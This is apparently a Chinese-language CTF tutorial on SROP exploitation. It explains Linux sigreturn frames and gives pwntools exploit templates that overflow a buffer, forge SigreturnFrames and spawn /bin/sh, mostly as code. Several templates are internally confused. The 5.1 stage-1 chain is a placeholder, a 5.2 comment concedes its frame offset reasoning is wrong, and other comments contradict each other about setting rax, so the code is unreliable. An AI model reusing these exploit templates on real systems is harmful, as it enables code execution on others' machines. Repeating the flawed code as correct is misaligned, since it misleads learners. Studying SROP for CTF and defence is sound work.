---
category: "SROP"
tags: ["SROP", "sigreturn", "SigreturnFrame", "rt_sigreturn", "syscall"]
difficulty: "高级"
---

# SROP与SigreturnFrame利用

## 1. 概述

SROP（Sigreturn-Oriented Programming）是ROP的一种高级形式，利用Linux信号处理机制中的`sigreturn`系统调用，通过伪造一个完整的Signal Frame来一次性设置所有寄存器的值。当可用gadget不充分时，SROP是最优雅的解决方案——仅需一个`syscall; ret` gadget即可控制所有寄存器。

在CTF离线场景中，SROP非常实用：不需要复杂的gadget搜索，对程序自身的gadget质量要求极低，只需一个`syscall`指令和一条可控的`rax`设置方式。

## 2. 核心原理

### 2.1 信号处理流程

```
1. 内核发送信号给进程
2. 内核在用户栈上压入 sigframe (保存所有寄存器)
3. 执行信号处理函数 (sa_handler)
4. 执行 rt_sigreturn 系统调用 (系统调用号: 15 即 0xF)
5. 内核从栈上恢复 saved sigframe -> 恢复所有寄存器
```

### 2.2 SigreturnFrame结构

```python
from pwn import *

# pwntools内置的SigreturnFrame
frame = SigreturnFrame()  # 默认64位

# 设置关键寄存器
frame.rax = 0             # read syscall number
frame.rdi = 0             # fd = stdin
frame.rsi = target_addr   # 写入目标
frame.rdx = 0x300         # 写入字节数
frame.rsp = new_rsp       # 新的栈指针
frame.rip = syscall_ret   # 执行syscall

# 32位 SigreturnFrame (使用 i386 架构)
context.arch = 'i386'
frame = SigreturnFrame()
frame.eax = 11            # execve
frame.ebx = bin_sh_addr
```

### 2.3 占用空间对比

| 技术 | 64位空间需求 | gadget要求 |
|------|------------|-----------|
| 传统execve ROP | ~40-56字节(6个gadget) | pop rax; pop rdi; pop rsi; pop rdx; syscall; ret |
| SROP | ~248字节(1个frame) | syscall; ret + 控制rax |
| mprotect+SROP | Frame + mprotect payload | extra |

## 3. 关键技巧/检测方法

### 3.1 SROP适用场景

```
- 程序仅有一个 read + write + 返回，无其他功能
- gadget极少，特别是缺乏 pop rdx 等稀有gadget
- 溢出空间足够大（>=248字节 to 300+字节）
- 程序使用系统调用（有syscall指令）
- 可以做多次SROP链（SROP chain）
```

### 3.2 SROP链（Stage Chain）

```
Stage 1: read(0, bss, 0x300) + 返回bss (SROP frame1)
Stage 2: 在bss上执行SROP frame2 -> execve("/bin/sh") 或 mprotect + shellcode
```

### 3.3 rax控制技巧

```python
# 方法1: read返回值 (read返回读入字节数)
# 发送0xF字节的payload -> read返回0xF -> rax=0xF(sigreturn)
# 注意：read返回后 rax = 读入字节数，刚好作为syscall号

# 方法2: 使用ppp6r gadget (pop rax)
# 如果有pop rax; ret，直接设置rax=0xF

# 方法3: 利用alarm/write等函数修改rax
# write返回后 rax = write的字节数 => 但不太好控制

# 方法4: xlat (x86) / cld etc
```

### 3.4 32位 vs 64位 SROP

| 对比项 | 32位 | 64位 |
|--------|-----|------|
| sigreturn syscall号 | 119 (0x77) | 15 (0xF) |
| frame大小 | ~?字节 | 248字节 |
| 调用方式 | int 0x80 | syscall |
| pwntools | `SigreturnFrame(kernel='i386')` | 默认amd64 |

## 4. 常见误区与注意事项

1. **Frame布局必须完全正确**：pwntools的SigreturnFrame已处理，手写需万分小心
2. **栈对齐**：新旧rsp都需要8/16字节对齐
3. **cs/ss/ds寄存器**：SROP成功后可能需正确设置段寄存器
4. **SROP+read**：第一发read返回15时，payload长度必须恰好15字节(不够放完整的frame)，因此通常需要两次read
5. **沙箱环境**：沙箱下execve被禁，SROP需做ORW（open/read/write）

## 5. 实战示例

### 5.1 经典SROP：read + sigreturn + execve

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
经典SROP利用：通过sigreturn设置execve("/bin/sh", 0, 0)
条件：syscall; ret gadget + 可控rax(如read返回值=15)
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./srop_vuln')
elf = ELF('./srop_vuln')

# ---- 找到关键gadget和地址 ----
syscall_ret = 0x401185   # syscall; ret
# 或 ROPgadget --binary ./vuln --only "syscall"

# 方法找到 /bin/sh 字符串
# 1. 在程序中搜索: next(elf.search(b'/bin/sh'))
# 2. 写入bss段: bss_buf + "/bin/sh\x00"
bss = 0x601000 + 0x500  # bss空闲区域

# 缓冲区偏移
offset = 0x20 + 8  # 0x20 buf + 8 saved rbp

# ---- 构造 SigreturnFrame ----
# 目标: execve("/bin/sh", 0, 0)
# rax=59(execve), rdi="bin/sh", rsi=0, rdx=0

frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # 59
frame.rdi = bss                    # "/bin/sh"的地址
frame.rsi = 0                      # argv = NULL
frame.rdx = 0                      # envp = NULL
frame.rsp = bss + 0x200            # 新的rsp（无所谓，execve不返回）
frame.rip = syscall_ret            # 执行 syscall

# ---- 第一次SROP：通过read设置rax=15 ----
# 发送恰好15字节使read返回15 -> rax = 15 = SYS_rt_sigreturn
# 但这15字节需要包含后续的syscall frame地址...
# 实际上15字节不够放frame，所以需要两次溢出

# 方案：如果需要两次写入，
# 第一次: overwrite ret addr -> 跳到 read(0, bss, 0x300)
# read读入的内容包含 SROP frame -> 触发 sigreturn

# 构造 read(0, bss, 0x300) 的ROP
# 需要 pop rdi; pop rsi; pop rdx gadgets
# 如果没有 pop rdx, 可以考虑 ret2csu

pop_rdi_ret = 0x401196
pop_rsi_r15_ret = 0x401194
read_got = elf.got['read']  # 或直接用syscall
main = elf.symbols['main']

# Stage 1: 调用 read(0, bss, 0x300) 然后回 main
# 假设有 pop rdx; ret (否则用csu或SROP)
# 这里展示理想情况

# 实际常用的技巧：直接在 .text 段找连续 read 调用
# 或者利用SROP做第一次read

# ---- 简化的SROP利用（漏洞有write/read功能时） ----
# 假设我们已经控制了rip，且有一个可用的syscall; ret
# 首先需要将stack pivot到可以放frame的地方

# Payload: 调用 sigreturn
payload1 = b'A' * offset
# 需要先设置 rax = 15 (rt_sigreturn)
# 然后 "syscall; ret"
# 没有直接设置rax的gadget？用read返回值

# 发送15字节，使read返回15 -> rax=15
# 但payload需要超过offset...
# 变通：先read 0xf字节到某个无关位置，设置rax=15
# 然后ROP到syscall

# ==== 完整的SROP流程 ====
# Step 1: read从offset开始，覆盖返回地址指向 syscall; ret
#         发足够数据使其包含完整的帧

# 关键：若read的返回值恰好为帧的大小，rax自然等于帧的大小
# 只需将帧大小设计为 0xF (15)从而 rax = SYS_rt_sigreturn

# 实际操作：构造帧，其大小为 15 是不可能的（帧本身248字节）
# 因此需要两次输入：
#   a) 第一次: 短读(15字节) -> rax=15 -> 跳转到syscall (此时rsp指向frame)
#      但frame还没在栈上...

# 最佳实践：利用已有read循环
# payload: 填充 -> pop_rsi; bss; pop_rdi; 0; pop_rdx; 0x300; syscall_ret 
#         -> 回到bss (rsp 被设置为bss地址，bss上的内容是第二个frame)
# 第一段ROP做 read(0, bss, 0x300) 并且设置 rsp 到 bss

# 在bss上构造srop frame + /bin/sh字符串
bss_payload = b'/bin/sh\x00'.ljust(0x100, b'\x00')  # /bin/sh在bss
bss_payload += bytes(SigreturnFrame({
    'rax': constants.SYS_execve,
    'rdi': bss + 0x100,  # "/bin/sh"被读到的位置？
    'rsi': 0,
    'rdx': 0,
    'rip': syscall_ret,
}))  # frame在bss+0x100? 实际偏移按需计算

# 第一次溢出payload
stage1 = b'A' * offset
# ... (此处需要具体的ROP链，但题目不同gadget不同)
# 核心思路：用 SROP frame 完成 read(0, bss, len) 再 pivot 到bss
# 或直接用第一次的溢出触发第二个SROP

p.send(stage1)
p.send(bss_payload)
p.interactive()
```

### 5.2 通用SROP Exploit模板（最小gadget需求）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
最小gadget需求的SROP利用模板
仅需: syscall; ret
优势: 不需要 pop rdi/rsi/rdx, 甚至不需要ret2text
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./minimal_binary')

# ---- 最小条件 ----
syscall_ret = 0x401185  # syscall; ret (唯一需要的gadget)
# 如果read在syscall附近，可以用read的返回值设置rax

# 目标: 在bss段写入 "/bin/sh" + execve SROP frame
bss = 0x601800

# ---- 构造读入用的SROP frame ----
# 目的: 调用 read(0, bss, 0x400) 将 "/bin/sh" + execve frame 写入bss
# 问题是: 如何让read的返回值是0xF？

# 方法: 不用read的返回值
# 使用已有的 pop rax; ret (如果有的话)
# 或使用两次SROP:
#   SROP1: rax=0(read), rdi=0, rsi=bss, rdx=0x400, rip=syscall_ret
#          触发read，读入新的SROP frame到bss
#          但read的返回值(读入字节数)覆盖rax！
#          所以读入的字节数必须是59(execve)或15(rt_sigreturn)

# 这就是 SROP链: 
# 1. 第一次read恰好读入15字节并触发rt_sigreturn
# 2. 第二次的sigreturn frame执行execve

# ---- Stage 1: 读入15字节触发sigreturn ----
# 输入1: 恰好15字节的frame -> read返回15 -> rax=15
# 然后执行 syscall -> rt_sigreturn! 
# 但15字节太小，frame放不下...
# 实际上我们需要栈上有完整frame

# 变通: 
# 输入1: 200+字节，ROP链设置下一步read(0, bss, 0x400)
# read执行时输入2恰好200+字节 -> rax=输入的字节数
# rax值无关，因为ROP链最后应该跳到syscall;ret

# 更好的方案：两阶段SROP chain
# Phase 1: 
#   - read(0, bss, 0x300) -> rsp=bss -> 跳转到bss上的phase 2
#   - 在bss上布置SROP frame

# Phase 2:
#   - SROP frame (execve) -> shell

# Phase 1的ROP链:
# 如果能控制overflow足够，直接布置完整的sigreturn frame在栈上
# 然后 syscall
# 一次SROP即可设置read并返回到bss

# ==== 完整的SROP利用链（单次溢出） ====
offset = 0x20 + 8

# 构造SROP frame: 用read读入第二阶段的frame
frame_read = SigreturnFrame()
frame_read.rax = constants.SYS_read   # 0
frame_read.rdi = 0                     # stdin
frame_read.rsi = bss                   # 写入bss
frame_read.rdx = 0x400                 # 读0x400字节
frame_read.rsp = bss                   # 读完后rsp指向bss（第二段frame开头)
frame_read.rip = syscall_ret           # 执行syscall (read)

# 构造第二阶段frame: execve
frame_execve = SigreturnFrame()
frame_execve.rax = constants.SYS_execve  # 59
frame_execve.rdi = bss + 0x200           # "/bin/sh"字符串位置
frame_execve.rsi = 0
frame_execve.rdx = 0
frame_execve.rip = syscall_ret

# 构造要写入bss的内容
bss_content = b'/bin/sh\x00'.ljust(0x200, b'\x00') + bytes(frame_execve)

# 第一阶段payload
payload1 = b'A' * offset
payload1 += p64(syscall_ret)  # ret addr
payload1 += bytes(frame_read)[8:]  # 跳过前8字节（已被pop rsp消费？不对，这里理解需要调整）
# 实际上 SROP 利用很多时候需要仔细计算栈布局

# 更精确的理解：溢出覆盖ret_addr为syscall_ret后，
# rsp指向payload中ret_addr之后的位置(即frame数据开始)
# syscall_ret = pop rip -> 继续到ret后执行 syscall
# 但 rsp 必须指向 frame 数据

# 简单示例（如果有pop rax; ret）:
# payload = padding + pop_rax + p64(15) + syscall_ret + frame_data
# 这样 rax=15 后执行 syscall 触发 rt_sigreturn，栈上的frame_data被恢复

# 发送payload
p.send(payload1)
# 然后发送bss_content（read会用第二个frame覆盖rsp）
p.send(bss_content)
p.interactive()

# 注意：本示例展示了SROP的核心思想，实际利用需要根据具体二进制调整
# 尤其是frame的布局和rsp的计算
```

### 5.3 32位SROP模板

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
32位SROP示例：int 0x80 + sigreturn (syscall=119)
"""
from pwn import *

context.arch = 'i386'
context.os = 'linux'

p = process('./srop32')

# 找到 int 0x80; ret gadget
int80_ret = 0x8049110
bss = 0x804a000 + 0x500

# 32位frame
frame = SigreturnFrame()
frame.eax = 11  # execve
frame.ebx = bss
frame.ecx = 0
frame.edx = 0
frame.eip = int80_ret
frame.esp = bss + 0x200

# 32位 sigreturn 号是 119
# payload 中设置 eax=119 然后 int 0x80
# 或通过read返回值设置

offset = 0x2c + 4  # 32位: buf_to_ebp + 4(save_ebp)
pop_eax_ret = 0x8049234  # pop eax; ret

payload = b'A' * offset
payload += p32(pop_eax_ret) + p32(119)  # rax = SYS_sigreturn (32位=119)
payload += p32(int80_ret)               # int 0x80
payload += bytes(frame)

p.send(payload)
p.interactive()
```

## 6. 相关知识点

- **ROP基础**：前置知识，见 02-ROP链构造技术.md
- **沙箱绕过与ORW**：沙箱下SROP做open/read/write，见 08-沙箱绕过与ORW.md
- **ret2csu**：当缺少pop rdx时的替代方案
- **mprotect + shellcode**：SROP 调用 mprotect 将某段内存改为RWX，再跳转执行shellcode
- **syscall号**：`/usr/include/asm/unistd_64.h`, 32位见 `unistd_32.h`
